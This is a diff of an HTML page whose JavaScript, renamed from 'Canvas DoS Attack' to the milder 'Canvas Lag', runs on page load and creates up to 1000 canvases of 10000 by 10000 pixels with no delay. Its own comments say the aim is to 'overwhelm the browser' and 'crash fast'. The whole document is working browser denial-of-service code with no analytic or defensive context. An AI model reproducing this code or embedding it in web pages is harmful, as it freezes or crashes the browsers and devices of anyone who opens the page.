@@ -1,44 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Canvas DoS Attack</title>
+  <title>Canvas Lag</title>
 </head>
 <body>
 <script>
-window.onload = function() {
-  function overloadCanvas() {
-    const canvasCount = 50;  // Increase number of canvases
+function overloadCanvas() {
     let counter = 0;
 
     function createCanvas() {
-      const canvas = document.createElement('canvas');
-      canvas.width = window.innerWidth;  // Full screen width
-      canvas.height = window.innerHeight;  // Full screen height
-      const ctx = canvas.getContext('2d');
-
-      // Random animation on canvas
-      function draw() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        for (let i = 0; i < 2000; i++) {  // Increase number of random shapes
-          ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
-          ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 100, 100);
+        const canvas = document.createElement('canvas');
+        canvas.width = 10000;
+        canvas.height = 10000;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = 'rgb(0,0,0)';
+        for (let i = 0; i < 1000; i++) {
+            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 500, 500);
         }
-        requestAnimationFrame(draw);  // Continue animation loop
-      }
+        document.body.appendChild(canvas);
 
-      document.body.appendChild(canvas);
-      draw();  // Start animation loop
-      counter++;
-      if (counter < canvasCount) {
-        setTimeout(createCanvas, 100);  // Add a slight delay before creating more canvases
-      }
+        // Add more canvases to overwhelm the browser
+        counter++;
+        if (counter < 1000) {  // Limiting to 1000 canvases for demonstration
+            setTimeout(createCanvas, 0);  // Create canvases without delay to crash fast
+        }
     }
 
-    createCanvas();  // Begin canvas creation
-  }
+    createCanvas();  // Start the canvas creation
+}
 
-  overloadCanvas();  // Start the overload
-};
+overloadCanvas();
 </script>
 </body>
 </html>
